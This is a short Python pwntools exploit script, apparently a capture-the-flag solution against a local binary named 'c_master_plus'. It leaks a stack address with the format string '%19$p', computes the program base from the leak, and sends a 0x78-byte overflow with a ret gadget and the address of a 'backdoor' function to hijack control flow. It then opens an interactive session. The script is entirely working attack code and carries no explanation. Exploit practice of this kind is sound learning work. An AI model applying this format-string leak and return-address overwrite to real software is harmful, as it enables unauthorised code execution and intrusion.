from pwn import *
context.log_level = 'debug'
r = process("./c_master_plus")

r.recvuntil(b'buf>')
r.sendline(b"%19$p")
r.recvuntil(b'0x')
base = int(r.recvline(), 16)-0x1160
print(hex(base))

backdoor = base+0x1433
ret = base+0x101a

payload = b'a'*0x78+p64(ret)+p64(backdoor)
r.recvuntil(b'fmt>')
r.sendline(b"%s")
r.sendline(payload)

r.interactive()
